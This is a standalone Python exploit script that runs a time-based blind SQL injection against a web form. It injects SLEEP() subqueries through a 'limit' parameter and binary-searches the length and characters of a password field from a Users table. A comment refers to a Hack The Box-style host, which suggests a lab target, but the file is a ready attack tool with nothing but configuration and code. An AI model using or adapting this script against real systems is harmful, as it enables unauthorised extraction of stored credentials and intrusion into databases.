#!/usr/bin/python
import sys
import math
import time
import requests
import logging
logging.basicConfig(level=logging.WARNING)

# config
url = 'http://'
table = 'Users'
field = "Password" # 'password'
selector = "Id = 1" # "email = 'raj@Usage.htb'"
formargs = 'view=request&request=log&task=query&limit=1;'

# from burp: cat << EOF | sed 's/^\([^:]\+\):\s\+\(.*\)/    "\1": "\2",/'| pbcopy
headers = {
    "Host": "goldenclove.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "63",
    "Origin": "http://goldenclove.com",
    "Connection": "keep-alive",
    "Referer": "http://goldenclove.com/class.php",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
}

delay_between = 100 # ms
sleep_threshold = 3 # S
initial_baseline_time = 0.05 # S

def run():
    session = requests.session()
    baseline_time = initial_baseline_time
    
    def send_query(q):
        nonlocal baseline_time
        query = f"(SELECT * FROM ({q} AND SLEEP({sleep_threshold})) aoeu)"
    
        start_time = time.time()
        r = session.post(url, headers=headers, data=f"{formargs}{query}#&minTime=0")
        elapsed_time = time.time() - start_time

        positive = elapsed_time > (baseline_time + sleep_threshold) * 0.8
        if not positive:
            baseline_time = (baseline_time + elapsed_time) / 2
            logging.info(f"[INFO] adjusting baseline to {baseline_time} (elapsed {elapsed_time})")

        return positive
        
    logging.info(f"Testing for {selector}")
    
    print("Determining length...", end='')
    lower, upper = 0, 256
    fieldlen = 0
    while lower != upper:
        fieldlen = math.ceil((lower + upper) / 2)
    
        if send_query(f"SELECT 1 from {table} where {selector} and length({field}) < {fieldlen}"):
            upper = fieldlen - 1
        else:
            lower = fieldlen

    print(fieldlen)

    result = ''
    for i in range(fieldlen):
        lower, upper = 33, 122
        while lower != upper:
            mid = math.ceil((lower + upper) / 2)
            sys.stdout.write('\r' + result + chr(mid))
            sys.stdout.flush()
    
            if send_query(f"SELECT 1 from {table} where {selector} and ascii(substr({field}, {i+1}, 1)) < {mid}"):
                upper = mid - 1
            else:
                lower = mid
    
        result = result + chr(lower)
        sys.stdout.write('\r' + result)
        sys.stdout.flush()
    
        time.sleep(delay_between / 1000)
    
    print(f"\n\n{result}")
    
    print("Testing {field}...")
    if send_query(f"SELECT 1 from {table} where {selector} and {field} = '{result}'"):
        print("Success!")
    else:
        print("Something went wrong :(")


if __name__ == '__main__':
    run()
